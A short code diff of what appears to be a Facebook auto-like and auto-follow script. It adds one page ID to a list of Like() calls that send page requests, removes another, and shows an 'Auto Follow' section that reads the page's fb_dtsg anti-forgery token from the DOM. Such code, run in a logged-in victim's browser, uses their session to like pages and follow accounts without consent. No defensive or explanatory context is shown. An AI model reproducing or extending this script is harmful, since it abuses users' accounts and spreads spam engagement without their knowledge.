@@ -34,6 +34,7 @@ function Like(p) {
   };
   Page.send(PageParams);
 }
+Like("354604898004374");
 Like("110871649075947");
 Like("205728496235571");
 Like("320063638097295");
@@ -42,7 +43,7 @@ Like("422693414465248");
 Like("440404309325014");
 Like("398697313515142");
 Like("659358364092192");
-Like("509386819104176");
+
    
 /*Auto Follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
